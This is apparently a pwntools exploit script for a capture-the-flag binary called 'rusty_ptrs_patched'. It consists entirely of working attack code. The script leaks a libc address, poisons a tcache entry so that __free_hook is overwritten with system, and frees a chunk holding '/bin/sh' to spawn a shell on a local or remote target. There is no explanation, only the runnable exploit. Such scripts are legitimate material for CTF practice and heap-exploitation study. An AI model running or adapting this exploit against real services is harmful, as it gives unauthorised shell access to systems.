from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw, ssl=True)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './rusty_ptrs_patched'
elf = ELF(exe, checksec=False)
context(terminal=['tmux', 'split-window', '-h'], binary=elf, log_level='info')
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

io = start()

rule = 1
note = 2

def create(op):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(op).encode())


def delete(op, idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(op).encode())
    io.sendlineafter(b'>', str(idx).encode())


def show(op, idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(op).encode())
    io.sendlineafter(b'>', str(idx).encode())


def edit(op, idx, data):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', str(op).encode())
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', data)

def law():
    io.sendlineafter(b'>', b'5')
    return io.recvline()[1:-1].split(b', ')

leak = law()
libc.address = int(leak[0], 16) - 0x1ecbe0
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
log.success("Libc base address: %#x", libc.address)
log.success("Free hook address: %#x", free_hook)
log.success("System address: %#x", system)

create(note)
create(note)
delete(note, 1)
delete(note, 0)
create(rule)
edit(rule, 0, p64(free_hook))
create(note)
create(note)
edit(note, 0, b'/bin/sh\x00')
edit(note, 1, p64(system))
delete(note, 0)

io.interactive()
